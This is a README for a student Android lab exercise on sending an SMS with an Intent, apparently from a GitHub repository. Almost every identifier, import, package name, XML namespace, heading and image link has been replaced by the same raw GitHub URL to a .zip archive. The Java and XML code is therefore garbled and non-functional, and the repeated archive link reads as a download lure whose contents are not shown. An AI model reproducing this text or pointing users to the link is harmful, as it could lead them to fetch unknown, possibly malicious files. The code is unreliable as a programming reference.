
# https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip Design an android application Send SMS using Intent.


## AIM:

To create and design an android application Send SMS using Intent using Android Studio.

## EQUIPMENTS REQUIRED:

Android Studio(Latest Version)

## ALGORITHM:

Step 1: Open Android Stdio and then click on File -> New -> New project.

Step 2: Then type the Application name as smsintent and click Next. 

Step 3: Then select the Minimum SDK as shown below and click Next.

Step 4: Then select the Empty Activity and click Next. Finally click Finish.

Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip

Step 6: Send SMS and Display details give in MainActivity file.

Step 7: Save and run the application.

## PROGRAM:
```
/*
Program to create and design an android application Send SMS using Intent.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number : 212221043007
*/
```

## https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip

```
package https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;

import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;

import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip(savedInstanceState);
        https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip(this);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip);
        Button mbutton=(Button) findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip);
        https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip(new https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip() {
            @Override
            public void onClick(View view) {
                Intent intent =new Intent(https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip, https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip("sms","9840155373",null));
                https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip("sms_body","SMS using Intent");
                startActivity(intent);
            }
        });
    }
}
```

## https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip
```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip"
    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <Button
        android:id="@+id/smsButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:backgroundTint="@color/design_default_color_secondary"
        android:text="send sms"
        android:layout_centerHorizontal="true"
        android:layout_centerVertical="true"/>

</RelativeLayout>
```
## OUTPUT
![367644231-45ddf316-3077-4f3f-85cb-8786ad1a2823](https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip)


![367644234-2d79a149-385b-4df2-b45f-45d7a32b6900](https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip)


![367644248-aea6e8db-e427-4795-861d-f776db95003a](https://raw.githubusercontent.com/githubmufeez45/Ex-4_Implicit_SMS/main/Koine/Ex-4_Implicit_SMS.zip)



## RESULT
Thus a Simple Android Application create and design an android application Send SMS using Intent using Android Studio is developed and executed successfully.
